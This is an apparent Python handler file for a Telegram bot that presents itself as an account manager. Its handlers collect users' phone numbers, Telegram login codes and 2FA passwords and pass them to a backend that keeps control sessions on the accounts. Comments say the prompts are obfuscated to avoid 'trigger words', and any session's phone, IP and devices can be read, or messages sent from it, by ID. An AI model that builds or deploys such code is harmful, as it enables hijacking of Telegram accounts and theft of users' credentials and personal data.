import os
import sys
import aiohttp
from aiogram import Router, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

from pathlib import Path

# ISOLATION: Get MVP root for imports
BASE_DIR = Path(__file__).resolve().parents[1]
if str(BASE_DIR) not in sys.path:
    sys.path.insert(0, str(BASE_DIR))

from bot_server.obfuscator import obfuscate
from shared.config import MANAGER_API_URL, SHOW_ALL_SESSIONS_IN_INFO
from shared.logging_utils import setup_logger

logger = setup_logger("BOT_HANDLERS")

router = Router()

class AuthState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_password = State()

@router.message(Command("start"))
async def start_cmd(message: Message):
    """Start of dialog. Greeting without trigger words."""
    await message.answer(
        "Hello! I am a bot to manage your accounts.\n\n"
        "Available commands:\n"
        "➕ /login — Connect new account (one account per ID)\n"
        "📋 /sessions — List of all active accounts (by ID)\n"
        "ℹ️ /info [id] — Get account data. Takes your ID by default (e.g., /info 1234567)\n"
        "📨 /ping [id] — [TEST] Send task: write to 'Saved Messages'.\n"
        "❌ /logout [id] — Logout from account and delete session."
    )

@router.message(Command("login"))
async def login_cmd(message: Message, state: FSMContext):
    """Initiating phone request. Using obfuscator to mask words!"""
    text = obfuscate("To connect your account, send your phone number by pressing the button below. We verify that the contact belongs to you.")
    
    # Share Contact button
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text=obfuscate("Send my number"), request_contact=True)]],
        resize_keyboard=True
    )
    await message.answer(text, reply_markup=keyboard)
    await state.set_state(AuthState.waiting_for_phone)

from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

def get_code_kb(current_code: str = "") -> InlineKeyboardMarkup:
    """Generation of digital keyboard (0-9) for code input."""
    # Create buttons 1-9 in a 3x3 grid
    buttons = []
    for i in range(1, 10, 3):
        row = [InlineKeyboardButton(text=str(j), callback_data=f"code_{j}") for j in range(i, i + 3)]
        buttons.append(row)
    
    # Add 0 and "Clear" button (C)
    buttons.append([
        InlineKeyboardButton(text="❌", callback_data="code_clear"),
        InlineKeyboardButton(text="0", callback_data="code_0"),
        InlineKeyboardButton(text="⬅️", callback_data="code_back")
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

async def _manager_request(endpoint: str, method: str = "GET", payload: dict = None, timeout: int = 10):
    """
    Standardized internal helper for all Bot -> Manager API communication.
    Handles sessions, timeouts, and logging with error classes.
    """
    url = f"{MANAGER_API_URL}{endpoint}"
    try:
        async with aiohttp.ClientSession() as session:
            if method == "POST":
                async with session.post(url, json=payload, timeout=timeout) as resp:
                    return await resp.json(), resp.status
            else:
                async with session.get(url, timeout=timeout) as resp:
                    return await resp.json(), resp.status
    except Exception as e:
        logger.error(f"Manager API Request Failed ({endpoint}): {type(e).__name__} - {e}")
        return None, 0 # Unreachable

@router.message(AuthState.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    """Got phone, sending request to Manager Server."""
    # STRICT CONTACT CHECK
    if not message.contact:
        await message.answer("⚠️ Please use the button at the bottom of the screen to send your contact.")
        return
        
    if message.contact.user_id != message.from_user.id:
        await message.answer("⚠️ That is someone else's contact! Please send YOUR contact via the button below.")
        return

    phone = message.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone

    session_id = str(message.from_user.id)
    wait_msg = await message.answer("Wait...", reply_markup=ReplyKeyboardRemove())

    # Step 1 REST API: Code request
    data, status = await _manager_request("/api/auth/send_code", method="POST", payload={"phone": phone, "session_id": session_id})
    
    if status == 200:
        await state.update_data(phone=phone, session_id=session_id, current_code="")
        try:
            await wait_msg.delete()
        except:
            pass
        
        text = obfuscate("Enter Telegram CODE (5 digits):") + "\n\n`_ _ _ _ _`"
        await message.answer(text, reply_markup=get_code_kb(), parse_mode="Markdown")
        await state.set_state(AuthState.waiting_for_code)
    else:
        if status == 0:
            await wait_msg.answer("⚠️ Manager server API unavailable.")
        else:
            detail = data.get('detail', 'Unknown error') if data else 'Empty response'
            if detail == "ALREADY_CONNECTED":
                await wait_msg.answer("✅ Your session is already connected!")
            elif detail == "SESSION_STOPPED":
                await wait_msg.answer("⚠️ Your session exists but is currently stopped. Use /logout to remove it, then /login again.")
            elif detail == "SESSION_NO_NETWORK":
                await wait_msg.answer("⚠️ Your session is running but Telegram is temporarily unreachable. Please try again in a moment.")
            elif detail == "FAILED_TO_CONNECT":
                await wait_msg.answer("❌ Could not connect to Telegram servers. Please check your connection and try /login again.")
            else:
                await wait_msg.answer(f"Server error: {detail}")
        await state.clear()

@router.callback_query(AuthState.waiting_for_code, lambda c: c.data.startswith("code_"))
async def process_code_callback(callback: CallbackQuery, state: FSMContext):
    """Processing numeric key presses."""
    cmd = callback.data.split("_")[1]
    data = await state.get_data()
    current_code = data.get("current_code", "")
    phone = data.get("phone")
    session_id = data.get("session_id")

    if cmd == "clear":
        current_code = ""
    elif cmd == "back":
        current_code = current_code[:-1]
    else:
        if len(current_code) < 5:
            current_code += cmd

    await state.update_data(current_code=current_code)
    
    mask = " ".join([f"`{current_code[i]}`" if i < len(current_code) else "`_`" for i in range(5)])
    text = obfuscate("Enter Telegram CODE (5 digits):") + f"\n\n{mask}"
    
    if len(current_code) < 5:
        await callback.message.edit_text(text, reply_markup=get_code_kb(current_code), parse_mode="Markdown")
        await callback.answer()
    else:
        await callback.message.edit_text(obfuscate("Checking code...") + f"\n\n{mask}", parse_mode="Markdown")
        await callback.answer("Logging in...")
        payload = {"phone": phone, "session_id": session_id, "code": current_code}
        data, status = await _manager_request("/api/auth/login", method="POST", payload=payload)
        
        if status == 200:
            await callback.message.answer(
                f"✅ Account connected!\n"
                f"Your Session ID: {data['id']}\n"
                f"Name: {data['username']}"
            )
            await state.clear()
        elif status == 401:
            await state.update_data(code=current_code)
            text = obfuscate("🔐 You have 2FA enabled. Enter account password:")
            await callback.message.answer(text)
            await state.set_state(AuthState.waiting_for_password)
        else:
            if status == 0:
                await callback.message.answer("⚠️ Manager server unavailable.")
            else:
                detail = data.get('detail', 'Unknown error') if data else 'Empty response'
                if detail == "PHONE_CODE_INVALID":
                    await callback.message.answer("❌ Invalid code! Please enter the code again.")
                    await state.update_data(current_code="")
                    text = obfuscate("Enter Telegram CODE (5 digits):") + "\n\n`_ _ _ _ _`"
                    await callback.message.edit_text(text, reply_markup=get_code_kb(), parse_mode="Markdown")
                    return
                
                if detail == "PHONE_CODE_EXPIRED":
                    await callback.message.answer("❌ Code expired! Please start the login process again with /login.")
                elif detail.startswith("AUTH_ERROR_FloodWait"):
                    await callback.message.answer("⏳ Too many attempts! Please wait and try again later.")
                else:
                    await callback.message.answer(f"❌ Auth error: {detail}")
            
            await state.clear()

@router.message(AuthState.waiting_for_password)
async def process_password(message: Message, state: FSMContext):
    """Sending 2FA password to server."""
    password = message.text.strip()
    data = await state.get_data()
    phone = data.get("phone")
    session_id = data.get("session_id")
    code = data.get("code")

    await message.answer("Checking password...")

    payload = {"phone": phone, "session_id": session_id, "code": code, "password": password}
    data, status = await _manager_request("/api/auth/login", method="POST", payload=payload)

    if status == 200:
        await message.answer(
            f"✅ Success! Account with 2FA connected.\n"
            f"Session ID: {data['id']}\n"
        )
        await state.clear()
    elif status == 0:
        await message.answer("⚠️ Failed to connect to auth server.")
        await state.clear()
    else:
        detail = data.get('detail', 'Unknown error') if data else 'Empty response'
        if detail == "PASSWORD_INVALID":
            await message.answer("❌ Incorrect password! Please try entering your 2FA password again.")
        elif detail == "PHONE_CODE_EXPIRED":
            await message.answer("❌ Login failed: code expired. Please try again with /login.")
            await state.clear()
        else:
            await message.answer(f"❌ Auth error: {detail}")
            await state.clear()

@router.message(Command("sessions"))
async def list_sessions_cmd(message: Message):
    """Request list of all userbots from Manager."""
    data, status = await _manager_request("/api/sessions")
    
    if status != 200:
        if status == 0:
            await message.answer("⚠️ Manager server is temporarily unavailable. Try again later.")
        else:
            await message.answer("Manager error while getting list.")
        return

    sessions = data.get("sessions", [])
    if not sessions:
        await message.answer("No active userbots.")
        return
    
    text = "🤖 **Active userbots:**\n\n"
    for s in sessions:
        status = "🟢" if s['is_running'] else "🔴"
        # Exclude ID in backticks for easy copying in TG
        text += f"{status} ID: `{s['session_id']}`\n"
    
    await message.answer(text, parse_mode="Markdown")

async def get_session_id_fallback(message: Message):
    """Helper to get session_id: from arguments or current user ID."""
    args = message.text.split()
    if len(args) >= 2:
        return args[1]
    
    # By default, return the ID of the user who sent the command
    return str(message.from_user.id)

@router.message(Command("info"))
async def get_info_cmd(message: Message):
    """Get info. If ID is not specified - look for current user's account."""
    session_id = await get_session_id_fallback(message)
    
    data, status = await _manager_request(f"/api/sessions/{session_id}/info")
    
    if status == 200:
        username = f"@{data.get('username')}" if data.get('username') else "missing"
        
        info_text = (
            f"🆔 **Session ID:** `{data.get('id')}`\n"
            f"👤 **Name:** {data.get('first_name')}\n"
            f"🔗 **Username:** {username}\n"
            f"📞 **Phone:** {data.get('phone')}\n\n"
        )
                    
        sessions = data.get("sessions", [])
        if sessions:
            # 1. Filter current session (always shown)
            current_session = next((s for s in sessions if s.get("current")), None)
            # 2. Filter other sessions (gated by config)
            other_sessions = [s for s in sessions if not s.get("current")]
            
            displayed_sessions = []
            if current_session:
                displayed_sessions.append(current_session)
            
            if SHOW_ALL_SESSIONS_IN_INFO:
                displayed_sessions.extend(other_sessions)
            
            if displayed_sessions:
                # Header and separators only shown when listing ALL sessions
                if SHOW_ALL_SESSIONS_IN_INFO:
                    info_text += "📱 **Active Sessions:**\n"
                
                for s in displayed_sessions:
                    if SHOW_ALL_SESSIONS_IN_INFO:
                        info_text += "━━━━━━━━━━━━━━━\n"
                    
                    # "This session" tag only needed when multiple sessions are visible
                    current_tag = " ✨ This session\n" if s.get("current") else ""
                    
                    info_text += (
                        f"{current_tag}"
                        f"🖥 **Device:** {s.get('device_model')} ({s.get('platform')})\n"
                        f"⚙️ **System:** {s.get('system_version')}\n"
                        f"📦 **App:** {s.get('app_name')} v{s.get('app_version')}\n"
                        f"🌐 **IP:** {s.get('ip')} ({s.get('country')})\n"
                        f"💠 **Official:** {'Yes' if s.get('official_app') else 'No'}\n"
                        f"🕒 **Last Active:** {s.get('date_active')}\n"
                    )
                    # Extra newline between sessions if there are more than one
                    if SHOW_ALL_SESSIONS_IN_INFO:
                        info_text += "\n"
        
        await message.answer(info_text, parse_mode="Markdown")
    else:
        if status == 0:
            await message.answer("⚠️ Manager server unavailable.")
        else:
            await message.answer(f"Session with ID {session_id} not found or offline.")

@router.message(Command("ping"))
async def send_ping_cmd(message: Message):
    """Connection test. If ID not specified - use own."""
    session_id = await get_session_id_fallback(message)
    
    payload = {
        "target": "me",
        "text": "Connection test. Everything is fine. 1.. 2.. 3.."
    }
    
    data, status = await _manager_request(f"/api/sessions/{session_id}/action/send_message", method="POST", payload=payload)
    
    if status == 200:
        await message.answer(f"✅ Task successfully sent to userbot ({session_id})!")
    elif status == 404:
        await message.answer(f"❌ Userbot ({session_id}) **is not bound** to an account. Use /login", parse_mode="Markdown")
    elif status == 401:
        await message.answer(f"⚠️ **Access lost!** Session ({session_id}) was revoked or banned. Remove it (/logout) and login again.", parse_mode="Markdown")
    elif status == 429:
        detail = data.get("detail", "Too many requests") if isinstance(data, dict) else data
        await message.answer(f"⏳ **Telegram limit:** {detail}")
    elif status == 503:
        await message.answer(f"⚠️ Userbot ({session_id}) is bound, but **no network**.", parse_mode="Markdown")
    elif status == 0:
        await message.answer(f"Manager server unavailable.")
    else:
        detail = data.get("detail", "Unknown error") if isinstance(data, dict) else data
        await message.answer(f"❌ Error sending task for {session_id}: {detail}")

@router.message(Command("logout"))
async def send_logout_cmd(message: Message):
    """Logout from account and delete session."""
    session_id = await get_session_id_fallback(message)
    
    wait_msg = await message.answer(f"Disconnecting account {session_id}...")
    
    data, status = await _manager_request(f"/api/sessions/{session_id}/logout", method="POST")
    
    if status == 200:
        await wait_msg.edit_text(f"✅ Account ({session_id}) successfully disconnected and all session data removed!")
    elif status == 0:
        await wait_msg.edit_text(f"Manager server unavailable.")
    else:
        await wait_msg.edit_text(f"❌ Error: Session ({session_id}) not found in the system.")
